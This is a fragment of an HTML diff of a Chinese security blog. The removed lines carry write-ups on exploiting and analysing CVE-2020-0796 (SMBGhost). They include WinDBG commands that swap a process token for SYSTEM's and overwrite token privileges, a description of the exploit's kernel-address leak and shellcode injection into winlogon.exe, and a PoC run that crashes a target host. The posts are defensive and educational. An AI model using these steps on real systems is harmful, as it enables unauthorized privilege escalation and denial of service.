class="line">CapabilityCount: 0   Capabilities: 0x0000000000000000</span><br><span class="line">LowboxNumberEntry: 0x0000000000000000</span><br><span class="line">Security Attributes:</span><br><span class="line">Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims</span><br><span class="line">Process Token TrustLevelSid: S-1-19-1024-8192</span><br></pre></td></tr></table></figure>
-
-<p>也可使用dt _TOKEN查看字段定义。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _TOKEN</span><br><span class="line">nt!_TOKEN</span><br><span class="line">  +0x000 TokenSource   : _TOKEN_SOURCE</span><br><span class="line">  +0x010 TokenId     : _LUID</span><br><span class="line">  +0x018 AuthenticationId : _LUID</span><br><span class="line">  +0x020 ParentTokenId  : _LUID</span><br><span class="line">  +0x028 ExpirationTime  : _LARGE_INTEGER</span><br><span class="line">  +0x030 TokenLock    : Ptr64 _ERESOURCE</span><br><span class="line">  +0x038 ModifiedId    : _LUID</span><br><span class="line">  +0x040 Privileges    : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">  +0x058 AuditPolicy   : _SEP_AUDIT_POLICY</span><br><span class="line">  ..</span><br></pre></td></tr></table></figure>
-
-<p>在尝试把替换cmd.exe进程的TOKEN指针之前，我们先执行一下whoami看看。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-4.jpg" alt="img"></p>
-<center>图4</center>
-
-<p>如图4中，whoami显示，当前账户是admin。</p>
-<p>手动查看cmd.exe进程的TOKEN指针和前文所述基本一致，不再赘述。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process 0 0 cmd.exe</span><br><span class="line">PROCESS ffff980ddcba8080</span><br><span class="line">  SessionId: 1 Cid: 0ae8  Peb: 1265dcd000 ParentCid: 0d38</span><br><span class="line">  DirBase: 530d6002 ObjectTable: ffffd58733943400 HandleCount: 75.</span><br><span class="line">  Image: cmd.exe</span><br></pre></td></tr></table></figure>
-
-<p>然后把cmd.exe进程的TOKEN指针替换为system的TOKEN指针。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; eq ffff980ddcba8080+0x360 ffffd587&#96;2c606040</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-5.jpg" alt="img"></p>
-<center>图5</center>
-
-<p>如图5中，再执行一下whoami显示，当前账户已经由admin变化为nt authority\system。</p>
-<h2 id="6-TOKEN-0x40偏移"><a href="#6-TOKEN-0x40偏移" class="headerlink" title="6 TOKEN+0x40偏移"></a>6 TOKEN+0x40偏移</h2><p>我们现在来看看memmove()函数的目的地址是否就是cve-2020-0796-local.exe进程的TOKEN指针。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">srv2!memmove(Src&#x3D;0xffff8205e4678590, Dst&#x3D;0xffff998e13d780a0,Size&#x3D;16)</span><br><span class="line"></span><br><span class="line">kd&gt; r</span><br><span class="line">rax&#x3D;ffff8205e4678290 rbx&#x3D;ffff8205e9ad4150 rcx&#x3D;ffff998e13d780a0</span><br><span class="line">rdx&#x3D;ffff8205e4678590 rsi&#x3D;0000000000000010 rdi&#x3D;ffff8205e4678010</span><br><span class="line">rip&#x3D;fffff80218327f68 rsp&#x3D;ffffe8861b123e70 rbp&#x3D;0000000000000002</span><br><span class="line"> r8&#x3D;0000000000000010 r9&#x3D;0000000000000000 r10&#x3D;ffff8205df002290</span><br><span class="line">r11&#x3D;ffffe8861b123e50 r12&#x3D;0000000000000000 r13&#x3D;ffff8205e8434680</span><br><span class="line">r14&#x3D;00000000ffffffff r15&#x3D;0000000000000000</span><br><span class="line">iopl&#x3D;0     nv up ei ng nz na po nc</span><br><span class="line">cs&#x3D;0010 ss&#x3D;0018 ds&#x3D;002b es&#x3D;002b fs&#x3D;0053 gs&#x3D;002b       efl&#x3D;00000286</span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff802&#96;18327f68 e85376ffff   call  srv2!memcpy (fffff802&#96;1831f5c0)</span><br><span class="line"></span><br><span class="line">kd&gt; db rdx L0n16</span><br><span class="line">ffff8205&#96;e4678590 bc ff ff f2 1f 00 00 00-bc ff ff f2 1f 00 00 00 ................</span><br><span class="line"></span><br><span class="line">kd&gt; db rcx L0n16</span><br><span class="line">ffff998e&#96;13d780a0 00 00 88 02 06 00 00 00-00 00 80 00 00 00 00 00 ................</span><br><span class="line"></span><br><span class="line">kd&gt; !process 0 0 cve-2020-0796-local.exe</span><br><span class="line">PROCESS ffff8205e9ad5080</span><br><span class="line">  SessionId: 1 Cid: 16e0  Peb: 44e943b000 ParentCid: 024c</span><br><span class="line">  DirBase: 1abc2002 ObjectTable: ffff998e13777580 HandleCount: 58.</span><br><span class="line">  Image: cve-2020-0796-local.exe</span><br><span class="line"></span><br><span class="line">kd&gt; dq ffff8205e9ad5080+0x360 L1</span><br><span class="line">ffff8205&#96;e9ad53e0 ffff998e&#96;13d7806e</span><br></pre></td></tr></table></figure>
-
-<p>我们发现memmove()函数的目的地0xffff998e<code>13d780a0和cve-2020-0796-local.exe进程的TOKEN指针存放地址ffff8205</code>e9ad53e0相去甚远。但却指向ffff998e`13d78060+0x40处。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _TOKEN</span><br><span class="line">nt!_TOKEN</span><br><span class="line">  +0x000 TokenSource   : _TOKEN_SOURCE</span><br><span class="line">  +0x010 TokenId     : _LUID</span><br><span class="line">  +0x018 AuthenticationId : _LUID</span><br><span class="line">  +0x020 ParentTokenId  : _LUID</span><br><span class="line">  +0x028 ExpirationTime  : _LARGE_INTEGER</span><br><span class="line">  +0x030 TokenLock    : Ptr64 _ERESOURCE</span><br><span class="line">  +0x038 ModifiedId    : _LUID</span><br><span class="line">  +0x040 Privileges    : _SEP_TOKEN_PRIVILEGES</span><br></pre></td></tr></table></figure>
-
-<p>从_TOKEN结构体的定义中，我们了解在0x40偏移处是一个_SEP_TOKEN_PRIVILEGES的结构。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; db ffff998e&#96;13d78060+0x40 L0x16</span><br><span class="line">ffff998e&#96;13d780a0 00 00 88 02 06 00 00 00-00 00 80 00 00 00 00 00 ................</span><br><span class="line">ffff998e&#96;13d780b0 00 00 80 40 00 00                 ...@..</span><br><span class="line"></span><br><span class="line">kd&gt; dt _SEP_TOKEN_PRIVILEGES ffff998e&#96;13d78060+0x40</span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">  +0x000 Present     : 0x00000006&#96;02880000</span><br><span class="line">  +0x008 Enabled     : 0x800000</span><br><span class="line">  +0x010 EnabledByDefault : 0x40800000</span><br><span class="line"></span><br><span class="line">kd&gt; p</span><br><span class="line">srv2!Srv2DecompressData+0x10d:</span><br><span class="line">fffff802&#96;18327f6d 8b442460    mov   eax,dword ptr [rsp+60h]</span><br></pre></td></tr></table></figure>
-
-<p>单步步过之后，再查看一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; db ffff998e&#96;13d78060+0x40 L0x16</span><br><span class="line">ffff998e&#96;13d780a0 bc ff ff f2 1f 00 00 00-bc ff ff f2 1f 00 00 00 ................</span><br><span class="line">ffff998e&#96;13d780b0 00 00 80 40 00 00                ...@..</span><br><span class="line"></span><br><span class="line">kd&gt; dt _SEP_TOKEN_PRIVILEGES ffff998e&#96;13d78060+0x40</span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">  +0x000 Present     : 0x0000001f&#96;f2ffffbc</span><br><span class="line">  +0x008 Enabled     : 0x0000001f&#96;f2ffffbc</span><br><span class="line">  +0x010 EnabledByDefault : 0x40800000</span><br></pre></td></tr></table></figure>
-
-<p>我们观察到cve-2020-0796-local.exe进程的TOKEN中的Privileges 确实被修改过了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _SEP_TOKEN_PRIVILEGES ffff8d8de&#96;1206040+0x40</span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">  [+0x000] Present     : 0x1ff2ffffbc [Type: unsigned __int64]</span><br><span class="line">  [+0x008] Enabled     : 0x1e60b1e890 [Type: unsigned __int64]</span><br><span class="line">  [+0x010] EnabledByDefault : 0x1e60b1e890 [Type: unsigned __int64]</span><br></pre></td></tr></table></figure>
-
-<p>这神奇的16字节数据正是之前我们曾观察到的System进程的TOKEN中的Privileges的Present值。Present字段表示启用的特权，Enabled字段表示拥有的特权。这神奇的16字节数据覆盖写进程的Privileges结构之后，系统即拥有并启用了的system进程所有的特权。</p>
-<p>我们了解到_SEP_TOKEN_PRIVILEGES是由3个bitmap构成的结构体，通过每bit是否为1来判断进程特权的。看上去应该不会超过64种特权。</p>
-<h2 id="7-“有种贪心叫我全要”"><a href="#7-“有种贪心叫我全要”" class="headerlink" title="7 “有种贪心叫我全要”"></a>7 “有种贪心叫我全要”</h2><p>如果我们把这16字节全部用0xFF填充呢？</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-6.jpg" alt="img"></p>
-<center>图6</center>
-
-<p>我们使用前文所述的WinDBG手动设置了一下，如图6所示，使用whoami /PRIV命令时会提示“错误： 指定的特权不存在”。我们在微软文档中也仅发现了44中特权。</p>
-<p>我们修改了Exploit的源码，编译后执行验证，并在之前的断点停下来确认符合预期。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">srv2!memmove(Src&#x3D;0xffff8205e32a2590, Dst&#x3D;0xffff998e11a4c6b0,Size&#x3D;16)</span><br><span class="line"></span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff802&#96;18327f68 e85376ffff   call  srv2!memcpy (fffff802&#96;1831f5c0)</span><br><span class="line"></span><br><span class="line">kd&gt; r</span><br><span class="line">rax&#x3D;ffff8205e32a2290 rbx&#x3D;ffff8205e5679150 rcx&#x3D;ffff998e11a4c6b0</span><br><span class="line">rdx&#x3D;ffff8205e32a2590 rsi&#x3D;0000000000000010 rdi&#x3D;ffff8205e32a2010</span><br><span class="line">rip&#x3D;fffff80218327f68 rsp&#x3D;ffffe8861a6f9e70 rbp&#x3D;0000000000000002</span><br><span class="line"> r8&#x3D;0000000000000010 r9&#x3D;ffff8205e4e008e0 r10&#x3D;ffff8205df002160</span><br><span class="line">r11&#x3D;ffffe8861a6f9e50 r12&#x3D;0000000000000000 r13&#x3D;ffff8205e8434680</span><br><span class="line">r14&#x3D;00000000ffffffff r15&#x3D;0000000000000000</span><br><span class="line">iopl&#x3D;0     nv up ei ng nz na po nc</span><br><span class="line">cs&#x3D;0010 ss&#x3D;0018 ds&#x3D;002b es&#x3D;002b fs&#x3D;0053 gs&#x3D;002b       efl&#x3D;00000286</span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff802&#96;18327f68 e85376ffff   call  srv2!memcpy (fffff802&#96;1831f5c0)</span><br><span class="line"></span><br><span class="line">kd&gt; db rdx L0n16</span><br><span class="line">ffff8205&#96;e32a2590 ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff ................</span><br><span class="line"></span><br><span class="line">kd&gt; db rcx L0n16</span><br><span class="line">ffff998e&#96;11a4c6b0 00 00 88 02 06 00 00 00-00 00 80 00 00 00 00 00 ................</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-7.jpg" alt="img"></p>
-<center>图7</center>
-
-<p>在图7中，结果显示这并不影响Exploit的效果，</p>
-<h2 id="8-特权影响名字？"><a href="#8-特权影响名字？" class="headerlink" title="8 特权影响名字？"></a>8 特权影响名字？</h2><p>替换TOKEN不仅可以获取特权，也直接变更了账户。这个可以理解。那么问题来了，虽然修改Privileges结构，可以获得特权，但又是如何影响账户名的呢？</p>
-<p>现在我们需要来看看exploit的源码。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-8.jpg" alt="img"></p>
-<center>图8</center>
-
-<p>如图8中源码显示，在修改本进程的_SEP_TOKEN_PRIVILEGES结构之后，就已经获得system进程的特权，后续调用了inject()函数。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-9.jpg" alt="img"></p>
-<center>图9</center>
-
-<p>在图9中，inject()函数中通过CreateToolhelp32Snapshot()创建进程快照，使用比较进程名的方法找到”winlogon.exe”进程。然后使用VirtualAllocEx申请了一块带有可执行属性的内存（PAGE_EXECUTE_READWRITE），WriteProcessMemory把shellcode写入目标进程，CreateRemoteThread()最终完成任务。这是一个经典的远程线程注入。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-10.jpg" alt="img"></p>
-<center>图10</center>
-
-<p>图10中shellcode应该开启cmd的功能。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-11.jpg" alt="img"></p>
-<center>图11</center>
-
-<p>如图11所示，从进程树上我们能清楚的看出cmd.exe是winlogon.exe的子进程，和powershell.exe并未任何关系。</p>
-<p>winlogon.exe是以nt authority\system用户的名义启动的，而子进程继承了父进程winlogon.exe的TOKEN，也就获得了system的特权，在使用whoami命令时显示用户也就是nt authority\system。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-12.jpg" alt="img"></p>
-<center>图12</center>
-
-<p>如图12所示，选取winlogon.exe作为注入进程只是一个特例，任何以NT AUTHORITY\SYSTEM或者其他特权账户名义启动的进程都有相同的效果。</p>
-<h2 id="9-应用层获取TOKEN的地址编程技巧"><a href="#9-应用层获取TOKEN的地址编程技巧" class="headerlink" title="9 应用层获取TOKEN的地址编程技巧"></a>9 应用层获取TOKEN的地址编程技巧</h2><p>前文我们介绍了如何借助WinDBG手动修改位于内核态内存的进程的访问令牌，现在我们需要了解一下exploit如何使用编程技巧从应用层获取了TOKEN的地址的。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-13.jpg" alt="img"></p>
-<p>从源码上来看，其使用get_process_token()获取到了token在内核中的地址，然后利用CVE-2020-0796漏洞向ktoken+0x40处，即访问令牌中的_SEP_TOKEN_PRIVILEGES字段，写入了数据。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-14.jpg" alt="img"></p>
-<center>图 14</center>
-
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-15.jpg" alt="img"></p>
-<center>图 15</center>
-
-<p>在Windows上有一些众所周知的信息泄漏技巧，如本例中使用的NtQuerySystemInformation函数。这个函数有一些神奇的功能，它会返回许多内核地址。我们主要感兴趣的是此函数能够提供目前分配的每个对象的列表，使用SystemExtendedHandleInformation参数调用NtQuerySystemInformation，我们可以得到SYSTEM_HANDLE_INFORMATION_EX结构。借助此列表，我们可以使用PID和句柄获取所需对象的内核地址。</p>
-<p>至此漏洞利用视角下的工作基本完成。</p>
-<h2 id="10-综述"><a href="#10-综述" class="headerlink" title="10 综述"></a>10 综述</h2><p>本文介绍了2种通过手动修改进程访问令牌或特权结构提升进程权限的技巧，分析了本地权限提升exploit中使用的获取内核地址信息的技巧。带领大家近距离体会了本地权限提升利用过程。后续有机会我们再谈谈关于此漏洞的检测防护。再次提醒请尽快安装官方补丁。</p>
-<h2 id="11-参考和引用"><a href="#11-参考和引用" class="headerlink" title="11 参考和引用"></a>11 参考和引用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;danigargu&#x2F;CVE-2020-0796</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;secauthz&#x2F;access-tokens</span><br><span class="line">https:&#x2F;&#x2F;attack.mitre.org&#x2F;techniques&#x2F;T1134&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;secauthz&#x2F;how-dacls-control-access-to-an-object</span><br><span class="line">https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-224058-1.htm</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;86188</span><br></pre></td></tr></table></figure>
-<h2 id="12-思考和讨论"><a href="#12-思考和讨论" class="headerlink" title="12 思考和讨论"></a>12 思考和讨论</h2><p>我们思考讨论以下3个问题有没有较好的解决办法？</p>
-<ol>
-<li>微软为何提供NtQuerySystemInformation函数查看SystemExtendedHandleInformation？</li>
-<li>对于简单bitmap结构的_SEP_TOKEN_PRIVILEGES，能不能参考栈cookie那样的形式进行设计？</li>
-</ol>
-
+          <p>初见是惊鸿一瞥，重逢是始料未及。各位“蓝颜知己”我们又见面了。本文是《漏洞分析视角下的CVE-2020-0796漏洞》的兄弟篇。CVE-2020-796漏洞成因已经在前文说明，这次我们从漏洞利用视角来看看CVE-2020-796漏洞。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -589,13 +314,6 @@
 
               <time title="创建时间：2020-04-01 08:00:00" itemprop="dateCreated datePublished" datetime="2020-04-01T08:00:00+08:00">2020-04-01</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-05 23:26:01" itemprop="dateModified" datetime="2020-05-05T23:26:01+08:00">2020-05-05</time>
-              </span>
 
           
 
@@ -608,155 +326,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="漏洞分析视角下的CVE-2020-0796漏洞"><a href="#漏洞分析视角下的CVE-2020-0796漏洞" class="headerlink" title="漏洞分析视角下的CVE-2020-0796漏洞"></a>漏洞分析视角下的CVE-2020-0796漏洞</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><ul>
-<li><p>2020年3月10日是微软补丁日，安全社区注意到Microsoft发布并立即删除了有关CVE-2020-0796的信息；</p>
-</li>
-<li><p>2020年3月11日早上，Microsoft发布了可纠正SMBv3协议如何处理特制请求的修补程序； </p>
-</li>
-<li><p>2020年03月12日微软发布安全公告声称Microsoft 服务器消息块 3.1.1 (SMBv3) 协议处理某些请求的方式中存在远程执行代码漏洞。成功利用此漏洞的攻击者可以获取在目标服务器或客户端上执行代码的能力。要利用针对服务器的漏洞，未经身份验证的攻击者可以将特制数据包发送到目标 SMBv3 服务器。要利用针对客户端的漏洞，未经身份验证的攻击者将需要配置恶意的 SMBv3 服务器，并说服用户连接到该服务器。此安全更新通过更正 SMBv3 协议处理这些特制请求的方式来修复此漏洞。</p>
-</li>
-<li><p>此缺陷可影响SMB协商中的客户端和服务端。服务端漏洞位于srv2.sys中，客户端漏洞位于mrxsmb.sys中，这两个漏洞最终都在SmbCompressDecompress中调用了相同的代码。</p>
-</li>
-</ul>
-<p>本文试以CVE-2020-0796为例，为读者呈现漏洞分析工作视角。</p>
-<h2 id="2-受影响的系统"><a href="#2-受影响的系统" class="headerlink" title="2. 受影响的系统"></a>2. 受影响的系统</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows 10 Version 1903 for 32-bit Systems</span><br><span class="line">Windows 10 Version 1903 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 1903 for x64-based Systems</span><br><span class="line">Windows 10 Version 1909 for 32-bit Systems</span><br><span class="line">Windows 10 Version 1909 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 1909 for x64-based Systems</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h2><p>首先我们来执行CVE-2020-0796的PoC</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\admin\CVE<span class="literal">-2020</span><span class="literal">-0796</span>\&gt; python .\poc.py <span class="number">192.168</span>.<span class="number">0.10</span></span><br><span class="line">ConnectedSent negotiate packet <span class="number">1</span></span><br><span class="line">Target responded with <span class="number">452</span> bytes</span><br><span class="line">Sent negotiate packet <span class="number">2</span></span><br><span class="line">Target responded with <span class="number">534</span> bytes</span><br><span class="line">Crash bytes sent</span><br><span class="line">winexcept timed out</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-1.png" alt="img"></p>
-<center>图 1</center>
-
-<p>如果目标系统未处于调试状态，我们将观察到目标设备如图1所示进入蓝屏状态。待Windows系统重启后，我们会使用WinDBG打开C:\Windows\System32\MEMORY.DMP文件，通过分析内存转储文件尝试找到触发蓝屏的原因。</p>
-<p>如果目标系统处于调试状态，将会在WinDBG中观测到如图2所示的中断：</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-2.png" alt="img"></p>
-<center>图 2</center>
-
-<h3 id="3-1-释放内存的错误"><a href="#3-1-释放内存的错误" class="headerlink" title="3.1 释放内存的错误"></a>3.1 释放内存的错误</h3><p>无论是任何一种情况，大多时候在WinDBG中首选执行!analyze -v，尝试由WinDBG自动分析导致问题的模块。</p>
-<p>或者查看栈回溯</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; kn# Child-SP          RetAddr           Call Site</span><br><span class="line">..</span><br><span class="line">0b fffff904&#96;bd3a2dd0 fffff806&#96;1b97e5ae nt!ExFreePool+0x9</span><br><span class="line">0c fffff904&#96;bd3a2e00 fffff806&#96;1b9d7f41 srvnet!SmbCompressionDecompress+0xfe</span><br><span class="line">0d fffff904&#96;bd3a2e70 fffff806&#96;1b9d699e srv2+0x17f41</span><br><span class="line">0e fffff904&#96;bd3a2ed0 fffff806&#96;1ba19a9f srv2+0x1699e</span><br><span class="line">0f fffff904&#96;bd3a2f00 fffff806&#96;1cdc496e srv2+0x59a9f</span><br><span class="line">..</span><br></pre></td></tr></table></figure>
-
-<p>如上文0x0C号栈帧所示，srvnet模块中的SmbCompressionDecompress函数在调用ExFreePool时是触发蓝屏的直接因素。</p>
-<p>同时，我们注意到上文0x0D号栈帧所示的返回函数是模块名+偏移量的形式，这是因为WinDBG没有加载srv2模块的的符号文件。加载srv2模块的符号之后，栈回溯更有可读性：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; lml</span><br><span class="line">start             end                 module name</span><br><span class="line">..</span><br><span class="line">fffff806&#96;1b960000 fffff806&#96;1b9b3000   srvnet     (pdb symbols) c:\symbol\srvnet.pdb\CFE2BF7A30464E7FCE0CC805AA1C96CB1\srvnet.pdb</span><br><span class="line">fffff806&#96;1b9c0000 fffff806&#96;1ba85000   srv2       (pdb symbols)          c:\symbol\srv2.pdb\E423CC65395AE603B3F59D9322DB98F31\srv2.pdb</span><br><span class="line">fffff806&#96;1cc00000 fffff806&#96;1d6b5000   nt         (pdb symbols)          